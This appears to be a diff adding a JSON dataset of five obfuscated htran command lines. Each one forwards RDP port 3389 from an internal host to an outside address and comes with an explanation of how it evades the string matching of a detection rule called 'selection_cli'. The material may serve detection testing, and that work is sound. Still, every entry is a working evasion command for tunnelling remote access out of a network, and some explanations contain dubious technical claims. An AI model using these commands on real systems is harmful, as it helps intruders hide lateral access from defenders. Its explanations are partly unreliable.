@@ -1,0 +1,22 @@
+[
+  {
+    "output": "htran.exe -tran\t192.168.1.50 3389 203.0.113.50 8888",
+    "explanation": "Substitution technique: Replacing the required single structural trailing space character flanking the switch option ('-tran ') with a horizontal tab character ('\\t'). The Windows kernel processes horizontal tabs natively as valid whitespace token separators during process argument tokenization. This ensures identical port-forwarding execution behavior while completely evading the strict space-padded literal substring constraints defined in 'selection_cli'."
+  },
+  {
+    "output": "htran -tran 192.168.1.50 3389 203.0.113.50 8888",
+    "explanation": "Omission technique: Omitting the '.exe' extension when invoking the binary from a command-line interpreter environment. The 'selection_cli' strings strictly match the prefix combination of the file extension and switch (e.g., '.exe -tran '). Since Windows automatically resolves and executes 'htran' as 'htran.exe', the rule's literal constraint is bypassed while high-level functionality remains identical."
+  },
+  {
+    "output": "htran.exe \"-tran\" 192.168.1.50 3389 203.0.113.50 8888",
+    "explanation": "Insertion technique: Enclosing the action configuration switch inside explicit double quotes ('\"-tran\"'). This alters the literal continuous sequence captured within process creation telemetry logs, successfully breaking the unquoted character stream evaluation, while the underlying Win32 subsystem strips the quotes natively during initialization."
+  },
+  {
+    "output": "htran.exe  -tran  192.168.1.50 3389 203.0.113.50 8888",
+    "explanation": "Insertion technique: Injecting multiple consecutive spaces between the binary name and the argument switch. Standard argument parsing models collapse contiguous whitespaces into single parameter arrays at execution initialization, ensuring functional equivalence while breaking rigid signature strings that look for an explicit single-space prefix structure ('.exe -tran ')."
+  },
+  {
+    "output": "cmd.exe /c htran.exe -tr^an 192.168.1.50 3389 203.0.113.50 8888",
+    "explanation": "Insertion technique: Running the command through cmd.exe permits the insertion of a command shell caret escape operator ('^') directly into the switch name parameter ('-tr^an'). The parent console subsystem filters this token out entirely prior to initiating the child context, logging '-tr^an' in process creation event streams and successfully subverting the selection logic."
+  }
+]
